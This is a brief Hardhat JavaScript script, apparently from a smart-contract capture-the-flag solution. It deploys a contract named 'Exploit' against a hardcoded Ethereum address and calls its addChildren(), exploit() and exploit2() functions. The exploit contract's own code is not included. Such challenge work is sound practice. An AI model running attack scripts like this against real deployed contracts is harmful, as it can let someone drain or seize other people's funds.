const { ethers } = require("hardhat");

async function main() {
    //const Setup = await ethers.getContractFactory("Setup");
    //const setup = await Setup.deploy();

    var address = '0xD683D56D31785f0Ee66f850c13Ae1CD2E19B2e4e';
    const Exploit = await ethers.getContractFactory("Exploit");
    console.log("deploying exploit...");
    const exploit = await Exploit.deploy(address);
    console.log("deployed exploit:", exploit.address);
    console.log("calling addChildren()...");
    await exploit.addChildren();
    console.log("calling exploit()...");
    await exploit.exploit();
    console.log("calling exploit2()...");
    await exploit.exploit2();
    console.log("done");
};
main().then(() => process.exit(0)).catch(error => {
  console.error(error);
  process.exit(1);
});
